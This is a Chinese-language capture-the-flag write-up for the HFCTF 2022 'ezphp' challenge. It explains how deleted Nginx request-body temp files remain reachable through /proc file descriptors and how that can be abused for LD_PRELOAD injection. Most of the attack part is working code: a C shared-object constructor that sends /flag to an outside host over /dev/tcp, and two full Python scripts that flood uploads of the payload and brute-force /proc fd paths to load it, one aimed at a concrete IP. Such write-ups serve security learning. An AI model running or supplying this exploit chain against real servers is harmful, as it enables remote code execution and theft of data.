@@ -1,0 +1,223 @@
+## HFCTF 2022 | ezphp
+## 考点
+  * Nginx 接收Fastcgi的过大响应 或 request body过大时会缓存到临时文件
+## 题目源码
+Dockerfile
+    FROM php:7.4.28-fpm-buster
+    LABEL Maintainer="yxxx"
+    ENV REFRESHED_AT 2022-03-14
+    ENV LANG C.UTF-8
+    RUN sed -i 's/http:\/\/security.debian.org/http:\/\/mirrors.163.com/g' /etc/apt/sources.list
+    RUN sed -i 's/http:\/\/deb.debian.org/http:\/\/mirrors.163.com/g' /etc/apt/sources.list
+    RUN apt upgrade -y && \
+        apt update -y && \
+        apt install nginx -y
+    ENV DEBIAN_FRONTEND noninteractive
+    COPY index.php /var/www/html
+    COPY default.conf /etc/nginx/sites-available/default
+    COPY flag /flag
+    EXPOSE 80
+    CMD php-fpm -D && nginx -g 'daemon off;'
+一开始的时候想错了，以为是要用php-fpm来打system，然后利用[P牛的payload](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html)直接打，结果发现不行。。。首先就是环境不对。然后参考了一下
+hxpctf2021 的 update 和 includer’s revenge。
+这种利用方式很巧妙，成功实现了 LFI = RCE，但实现起来也有困难。
+### 临时文件的生成
+> client_body_buffer_size:  
+>  Sets buffer size for reading client request body. In case the request body
+> is larger than the buffer, the whole body or only its part is written to a
+> temporary file. By default, buffer size is equal to two memory pages. This
+> is 8K on x86, other 32-bit platforms, and x86-64. It is usually 16K on other
+> 64-bit platforms.
+设置用于读取客户端请求正文的缓冲区大小。如果请求正文大于缓冲区，则整个正文或仅其部分将写入临时文件。默认情况下，缓冲区大小等于两个内存页。这是 x86、其他
+32 位平台和 x86-64 上的 8K。在其他 64 位平台上，它通常为 16K。
+在`ngx_open_tempfile`中Nginx临时文件的创建方式：
+    ngx_fd_t
+    ngx_open_tempfile(u_char *name, ngx_uint_t persistent, ngx_uint_t access)
+    {
+        ngx_fd_t  fd;
+        fd = open((const char *) name, O_CREAT|O_EXCL|O_RDWR,
+                  access ? access : 0600);
+        if (fd != -1 && !persistent) {
+            (void) unlink((const char *) name);
+        }
+        return fd;
+    }
+创建之后会马上删除这个文件，然后把这个文件的`fd`返回出去。
+那我们能不能利用条件竞争然后写入临时文件呢？很遗憾，很难。因为临时文件的文件名与Nginx的请求处理长度有关，随着请求处理的增长而增长，
+且临时文件的文件名一般为`/var/lib/nginx/body/000000xxxx`，一个十位向左填充0的数字。所以我们不但需要去爆破文件名，还要同时利用条件竞争保存临时文件，完成两个基本不可能。
+### 复刻Nginx
+我们可以用 c 简单复刻一个大概的 demo ，使用如下代码模拟 Nginx 对于临时文件处理的行为
+贴一份大佬的代码：
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    int main() {
+        puts("[+] test for open/unlink/write [+]\n");
+        int fd = open("test.txt", O_CREAT|O_EXCL|O_RDWR, 0600);
+        printf("open file with fd %d,try unlink\n",fd);
+        unlink("test.txt");
+        printf("unlink file, try write content\n");
+        if(write(fd, "", 19) != 19)
+        {
+            printf("write file error!\n");
+        }
+        char buffer[0x10] = {0};
+        lseek(fd, 0,SEEK_SET);
+        int size = read(fd, buffer , 19);
+        printf("read size is %d\n",size);
+        printf("read buffer is %s\n",buffer);
+        while(1) {
+            sleep(10);
+        }
+        // close(fd);
+        return 0;
+    }
+    dr-x------ 2 root root  0 Mar  22 15:33 ./
+    dr-xr-xr-x 9 root root  0 Mar  22 15:33 ../
+    lrwx------ 1 root root 64 Mar  22 15:33 0 -> /dev/pts/0
+    lrwx------ 1 root root 64 Mar  22 15:33 1 -> /dev/pts/0
+    lrwx------ 1 root root 64 Mar  22 15:33 2 -> /dev/pts/0
+    lrwx------ 1 root root 64 Mar  22 15:33 3 -> /root/test/test (deleted)
+可以看到，在对应进程的`proc`目录下，存在对应的fd项目，且为一个软链接，连接到`/root/test/test
+(deleted)`，表明该文件已被删除，但仍然可以继续写入并读出。对于软链接文件，PHP会尝试先对软链接进行解析，此时php还会产生临时文件，再将其打开。只要能找到对应的线程，竞争到`proc`中的fd即可完成包含，就可以对我们发送的payload进行包含
+总结起来整个过程就是：
+  * 让后端 php 请求一个过大的文件
+  * Fastcgi 返回响应包过大，导致 Nginx 产生临时文件进行缓存
+  * Nginx 删除了`/var/lib/nginx/body`下的临时文件，但是在 `/proc/pid/fd/` 下我们可以找到被删除的文件
+  * 遍历 pid 以及 fd ，使用多重链接绕过 PHP 包含策略完成 LFI
+## 回到题目
+看到上面的例子，其实应该就有思路了：只需要想办法写入so文件到Nginx缓存就可以了。
+    #include 
+    #include 
+    __attribute__ ((constructor)) void call ()
+    {
+        unsetenv("LD_PRELOAD");
+        char str[65536];
+        system("bash -c 'cat /flag' > /dev/tcp/ip/port");
+        system("cat /flag > /var/www/html/flag");
+    }
+生成.so文件
+    gcc test.c -fpIC -shared -o libsss.so
+再通过python脚本，一直往服务器传写入.so文件，之后在URL后面访问flag，得到答案。
+    import requests
+    import threading
+    import multiprocessing
+    import threading
+    import random
+    URL = f'xxx.xxx.xxx.xxx'
+    nginx_workers = [12, 13, 14, 15]
+    done = False
+    # upload a big client body to force nginx to create a /var/lib/nginx/body/$X
+    def uploader():
+        while not done:
+            requests.get(URL, data=open("C:\\Users\\Desktop\\libsss.so", "rb").read() + (16*1024*'A').encode())
+    for _ in range(16):
+        t = threading.Thread(target=uploader)
+        t.start()
+    def bruter(pid):
+        global done
+        while not done:
+            print(f'[+] brute loop restarted: {pid}')
+            for fd in range(4, 32):
+                f = f'/proc/{pid}/fd/{fd}'
+                print(f)
+                try:
+                    r = requests.get(URL, params={
+                        'env': 'LD_PRELOAD='+f,
+                    })
+                    print(r.text)
+                except Exception:
+                    pass
+    for pid in nginx_workers:
+        a = threading.Thread(target=bruter, args=(pid, ))
+        a.start()
+贴一份完整脚本：
+    import requests
+    import threading
+    import multiprocessing
+    import threading
+    import random
+    SERVER = "http://120.79.121.132:20674"
+    NGINX_PIDS_CACHE = set([x for x in range(10,15)])
+    # Set the following to True to use the above set of PIDs instead of scanning:
+    USE_NGINX_PIDS_CACHE = True
+    def create_requests_session():
+        session = requests.Session()
+        # Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead
+        adapter = requests.adapters.HTTPAdapter(pool_connections=1000, pool_maxsize=10000)
+        session.mount('http://', adapter)
+        return session
+    def get_nginx_pids(requests_session):
+        if USE_NGINX_PIDS_CACHE:
+            return NGINX_PIDS_CACHE
+        nginx_pids = set()
+        # Scan up to PID 200
+        for i in range(1, 200):
+            cmdline = requests_session.get(SERVER + f"/index.php?env=LD_PRELOAD%3D/proc/{i}/cmdline").text
+            if cmdline.startswith("nginx: worker process"):
+                nginx_pids.add(i)
+        return nginx_pids
+    def send_payload(requests_session, body_size=1024000):
+        try:
+            # The file path (/bla) doesn't need to exist - we simply need to upload a large body to Nginx and fail fast
+            payload = open("hack.so","rb").read()
+            requests_session.post(SERVER + "/index.php?action=read&file=/bla", data=(payload + (b"a" * (body_size - len(payload)))))
+        except:
+            pass
+    def send_payload_worker(requests_session):
+        while True:
+            send_payload(requests_session)
+    def send_payload_multiprocess(requests_session):
+        # Use all CPUs to send the payload as request body for Nginx
+        for _ in range(multiprocessing.cpu_count()):
+            p = multiprocessing.Process(target=send_payload_worker, args=(requests_session,))
+            p.start()
+    def generate_random_path_prefix(nginx_pids):
+        # This method creates a path from random amount of ProcFS path components. A generated path will look like /proc//cwd/proc//root/proc//root
+        path = ""
+        component_num = random.randint(0, 10)
+        for _ in range(component_num):
+            pid = random.choice(nginx_pids)
+            if random.randint(0, 1) == 0:
+                path += f"/proc/{pid}/cwd"
+            else:
+                path += f"/proc/{pid}/root"
+        return path
+    def read_file(requests_session, nginx_pid, fd, nginx_pids):
+        nginx_pid_list = list(nginx_pids)
+        while True:
+            path = generate_random_path_prefix(nginx_pid_list)
+            path += f"/proc/{nginx_pid}/fd/{fd}"
+            try:
+                d = requests_session.get(SERVER + f"/index.php?env=LD_PRELOAD%3D{path}").text
+            except:
+                continue
+            # Flags are formatted as hxp{}
+            if "HFCTF" in d:
+                print("Found flag! ")
+                print(d)
+    def read_file_worker(requests_session, nginx_pid, nginx_pids):
+        # Scan Nginx FDs between 10 - 45 in a loop. Since files and sockets keep closing - it's very common for the request body FD to open within this range
+        for fd in range(10, 45):
+            thread = threading.Thread(target = read_file, args = (requests_session, nginx_pid, fd, nginx_pids))
+            thread.start()
+    def read_file_multiprocess(requests_session, nginx_pids):
+        for nginx_pid in nginx_pids:
+            p = multiprocessing.Process(target=read_file_worker, args=(requests_session, nginx_pid, nginx_pids))
+            p.start()
+    if __name__ == "__main__":
+        print('[DEBUG] Creating requests session')
+        requests_session = create_requests_session()
+        print('[DEBUG] Getting Nginx pids')
+        nginx_pids = get_nginx_pids(requests_session)
+        print(f'[DEBUG] Nginx pids: {nginx_pids}')
+        print('[DEBUG] Starting payload sending')
+        send_payload_multiprocess(requests_session)
+        print('[DEBUG] Starting fd readers')
+        read_file_multiprocess(requests_session, nginx_pids)
+参考链接：[hxp CTF 2021 - A New Novel LFI](https://tttang.com/archive/1384/ "hxp
+CTF 2021 - A New Novel LFI")
